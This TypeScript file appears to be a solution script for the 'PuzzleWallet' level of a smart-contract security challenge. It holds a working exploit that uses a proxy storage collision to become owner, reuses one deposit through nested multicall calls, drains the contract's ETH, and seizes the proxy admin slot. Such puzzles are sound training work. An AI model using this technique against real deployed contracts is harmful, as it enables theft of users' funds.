import { PuzzleProxy, PuzzleWallet } from '../../typechain-types';
import { EthereumClient } from '../ethereum/ethereum-client';
import { Attacker } from './attacker-provider';

export const PUZZLE_WALLET_LEVEL_NAME = "PuzzleWallet"

export const puzzleWalletAttacker = (): Attacker => {
    return {
        attack: async (ethereum: EthereumClient, instanceAddress: string) => {
            const puzzleContract = await ethereum.getContract<PuzzleWallet>('PuzzleWallet', instanceAddress);
            const puzzleProxy = await ethereum.getContract<PuzzleProxy>('PuzzleProxy', instanceAddress);

            const player = await ethereum.getPlayerAddress();

            console.log('Proposing new admin (setting up owner) to players address');
            const firstTx = await puzzleProxy.proposeNewAdmin(player);
            await firstTx.wait();

            console.log('Adding player to whitelist')
            const secondTx = await puzzleContract.addToWhitelist(player);
            await secondTx.wait();

            console.log('Abusing multicall with nested deposit');
            const depositSelector = ethereum.createCallData('deposit');
            const multicallWithDeposit = ethereum.createCallData('multicall', ['bytes[]'], [[depositSelector]]);
            
            const multiTx = await puzzleContract.multicall([depositSelector, multicallWithDeposit], {value: ethereum.parseEther('0.001')});
            await multiTx.wait();

            console.log('Stealing the contracts ETH');
            const value = ethereum.parseEther('0.002');
            const emptyCallData = ethereum.encodeAs32Bytes('');
            const withdrawTx = await puzzleContract.execute(player, value, emptyCallData);
            await withdrawTx.wait();

            console.log('Setting the admin of the proxy to player');
            const adminTx = await puzzleContract.setMaxBalance(player);
            await adminTx.wait();

        }
    }
}